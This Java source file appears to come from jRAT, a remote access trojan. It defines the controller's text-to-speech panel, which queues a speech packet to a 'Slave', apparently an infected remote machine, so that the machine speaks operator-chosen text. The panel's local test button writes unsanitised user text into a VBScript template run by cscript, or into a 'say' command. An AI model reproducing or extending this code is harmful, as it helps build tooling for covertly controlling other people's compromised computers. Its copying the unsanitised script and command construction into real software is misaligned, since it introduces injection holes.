package se.jrat.client.ui.panels;

import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;

import javax.swing.GroupLayout;
import javax.swing.GroupLayout.Alignment;
import javax.swing.JButton;
import javax.swing.JScrollPane;
import javax.swing.JSeparator;
import javax.swing.JTextPane;
import javax.swing.LayoutStyle.ComponentPlacement;
import javax.swing.ScrollPaneConstants;
import javax.swing.SwingConstants;

import se.jrat.client.ErrorDialog;
import se.jrat.client.Main;
import se.jrat.client.Slave;
import se.jrat.client.packets.outgoing.Packet76Speech;
import se.jrat.client.utils.IOUtils;
import se.jrat.client.utils.IconUtils;

import com.redpois0n.oslib.OperatingSystem;


@SuppressWarnings("serial")
public class PanelControlSpeech extends PanelControlParent {
	private JTextPane txt;

	public PanelControlSpeech(Slave sl) {
		super(sl);

		JScrollPane scrollPane = new JScrollPane();
		scrollPane.setVerticalScrollBarPolicy(ScrollPaneConstants.VERTICAL_SCROLLBAR_ALWAYS);

		JButton btnTest = new JButton("Test");
		btnTest.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
					try {
						File f = File.createTempFile("jratspeechtest", ".vbs");
						FileWriter writer = new FileWriter(f, false);
						BufferedWriter writer1 = new BufferedWriter(writer);
						writer1.write(IOUtils.readString(Main.class.getResourceAsStream("/files/speech.vbs")).replace("%TEXT%", txt.getText()));
						writer1.close();

						Process p = Runtime.getRuntime().exec(new String[] { "cscript", f.getAbsolutePath() });
						p.waitFor();
						f.delete();
					} catch (Exception e) {
						e.printStackTrace();
						ErrorDialog.create(e);
					}
				} else {
					try {
						Runtime.getRuntime().exec("say " + txt.getText().trim());
					} catch (Exception e) {
						e.printStackTrace();
						ErrorDialog.create(e);
					}
				}
			}
		});
		btnTest.setIcon(IconUtils.getIcon("balloon_sound"));

		JButton btnSend = new JButton("Send");
		btnSend.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				slave.addToSendQueue(new Packet76Speech(txt.getText().trim()));
			}
		});
		btnSend.setIcon(IconUtils.getIcon("right"));

		JSeparator separator = new JSeparator();
		separator.setOrientation(SwingConstants.VERTICAL);

		JButton btnClear = new JButton("Clear");
		btnClear.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				txt.setText("");
			}
		});
		btnClear.setIcon(IconUtils.getIcon("clear"));
		GroupLayout groupLayout = new GroupLayout(this);
		groupLayout.setHorizontalGroup(groupLayout.createParallelGroup(Alignment.LEADING).addComponent(scrollPane, GroupLayout.DEFAULT_SIZE, 600, Short.MAX_VALUE).addGroup(groupLayout.createSequentialGroup().addContainerGap().addComponent(btnTest).addPreferredGap(ComponentPlacement.RELATED).addComponent(btnSend).addPreferredGap(ComponentPlacement.RELATED).addComponent(separator, GroupLayout.PREFERRED_SIZE, 1, GroupLayout.PREFERRED_SIZE).addPreferredGap(ComponentPlacement.RELATED).addComponent(btnClear).addContainerGap(332, Short.MAX_VALUE)));
		groupLayout.setVerticalGroup(groupLayout.createParallelGroup(Alignment.LEADING).addGroup(groupLayout.createSequentialGroup().addComponent(scrollPane, GroupLayout.PREFERRED_SIZE, 305, GroupLayout.PREFERRED_SIZE).addPreferredGap(ComponentPlacement.RELATED).addGroup(groupLayout.createParallelGroup(Alignment.LEADING).addGroup(groupLayout.createParallelGroup(Alignment.BASELINE).addComponent(btnTest).addComponent(btnSend)).addComponent(separator, GroupLayout.PREFERRED_SIZE, 23, GroupLayout.PREFERRED_SIZE).addComponent(btnClear)).addContainerGap(14, Short.MAX_VALUE)));

		txt = new JTextPane();
		txt.setText("Text to Speech");
		scrollPane.setViewportView(txt);
		setLayout(groupLayout);
	}
}
